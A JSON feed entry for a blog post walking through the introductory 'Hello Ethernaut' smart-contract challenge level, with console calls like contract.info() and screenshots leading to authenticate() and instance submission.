            "content_html": "<p>Look into the level‚Äôs info method <code class=\"language-plaintext highlighter-rouge\">contract.info()</code>  or¬†<code class=\"language-plaintext highlighter-rouge\">await contract.info()</code>¬† if you‚Äôre using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info().png\" alt=\"Image await contract.info()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info1().png\" alt=\"Image await contract.info1()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info2().png\" alt=\"Image await contract.info2()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_infoNum().png\" alt=\"Image await contract.infoNum()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info42().png\" alt=\"Image await contract.info42()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_theMethodName().png\" alt=\"Image await contract.theMethodName()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_method7123949().png\" alt=\"Image await contract.method7123949()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_authenticate().png\" alt=\"Image await contract.authenticate()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/mm.png\" alt=\"Image Metamask\" /></p><p>after transaction called, clik the ‚ÄúSubmit Instance‚Äù button</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            
            
            
            "tags": ["blockchain","ethernaut"],
            
            "date_published": "2025-04-16T00:00:00+09:00",
            "date_modified": "2025-04-16T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}